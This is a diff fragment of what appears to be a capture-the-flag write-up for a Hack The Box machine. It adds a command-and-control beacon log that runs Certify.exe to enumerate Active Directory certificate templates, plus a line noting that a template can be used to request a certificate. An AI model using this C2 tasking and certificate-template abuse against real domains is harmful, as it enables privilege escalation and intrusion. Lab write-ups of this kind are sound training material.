@@ -438,7 +438,10 @@ https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Cer
 Ill download the exe and run it through beacon
 
 ```python
-
+[20/08 20:13:51] ethan [471b11ef] beacon > execute-assembly /home/kali/htb/darkzero/Certify.exe enum-templates
+[20/08 20:13:51] [*] Task: execute .NET assembly
+[20/08 20:13:52] [*] Agent called server, sent [972.09 Kb]
+[20/08 20:14:11] [+] BOF output
 
 [*] Certificate templates found using the current filter parameters:
 
@@ -470,3 +473,4 @@ Ill download the exe and run it through beacon
                                       darkzero-ext\Enterprise Admins     S-1-5-21-1969715525-31638512-2552845157-519
 ```
 
+I can use this template, to request a certificate, 
